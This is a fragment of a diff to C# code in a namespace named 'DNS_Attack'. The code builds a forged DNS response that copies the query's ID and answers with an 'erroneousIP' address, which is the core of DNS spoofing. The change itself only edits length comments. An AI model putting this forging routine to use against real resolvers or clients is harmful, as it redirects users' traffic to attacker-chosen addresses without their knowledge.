@@ -56,11 +56,11 @@ namespace DNS_Attack {
             int urlLength = ParseDNSQueryURL(dnsQuery).Length + 1;
             byte[] answer = new byte[urlLength + 33];
             Array.Copy(dnsQuery, 0, answer, 0, 2);  // ID
-            Array.Copy(headerWithoutId, 0, answer, 2, 10 /* headerWithoutId.length() */);
+            Array.Copy(headerWithoutId, 0, answer, 2, 10 /* headerWithoutId.Length */);
             Array.Copy(dnsQuery, 12, answer, 12, urlLength + 5); // Query [URL + URL terminator (0x00) + QType (16 bits) + QClass (16 bits)]
-            Array.Copy(answerSectionBegin, 0, answer, urlLength + 17, 6);
-            Array.Copy(answerSectionTTL, 0, answer, urlLength + 23, 4);
-            Array.Copy(answerSectionIpLength, 0, answer, urlLength + 27, 2);
+            Array.Copy(answerSectionBegin, 0, answer, urlLength + 17, 6 /* answerSectionBegin.Length */);
+            Array.Copy(answerSectionTTL, 0, answer, urlLength + 23, 4 /* answerSectionTTL.Length */);
+            Array.Copy(answerSectionIpLength, 0, answer, urlLength + 27, 2 /* answerSectionIpLength.Length */);
             string[] ipParts = erroneousIP.Split('.');
             for (int i = 0; i < ipParts.Length; i++)
                 answer[urlLength + 29 + i] = (byte)(int.Parse(ipParts[i]));
